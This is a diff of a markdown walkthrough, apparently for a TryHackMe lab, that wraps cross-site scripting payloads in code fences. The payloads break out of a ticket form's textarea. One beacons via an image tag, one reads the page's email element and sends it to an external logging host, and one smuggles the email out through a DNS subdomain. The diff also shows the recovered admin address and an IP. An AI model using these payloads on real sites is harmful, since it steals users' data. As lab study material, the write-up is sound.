@@ -150,8 +150,9 @@ Finished
 
 <p>Since there is thistool and we have a ticket system used some specific payloads.</p>
 
+```bash
 </textarea><img src="http:eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech"><textarea>
-
+```
 
 <br>
 
@@ -164,29 +165,37 @@ Finished
 
 <br>
 
+```bash
 <p></textarea><script>var i=new Image;i.src="http://eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech/?"+document.getElementById('email').innerHTML;</script></p>
+```
 
 <br>
+
+```bash
 
 </textarea>
 <script>
 var email = document.getElementById("email").innerHTML;
-email = email.replace('@', '@');
-email = email.replace('.', '.');
+email = email.replace('@', 'A');
+email = email.replace('.', 'B');
 fetch('http://'+ email + '.eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech');
 </script>
 <textarea>
+```
 
 ![image](https://github.com/user-attachments/assets/4d4ffd1e-04bb-4117-9530-dd96b52773cc)
 
 
 <br>
 
+```bash
 
 adminaccountaitsupportbthm
 
 adminaccount a it support b thm
 adminaccount@itsupport.thm and 3.251.105.234
+
+```
 
 <br>
 
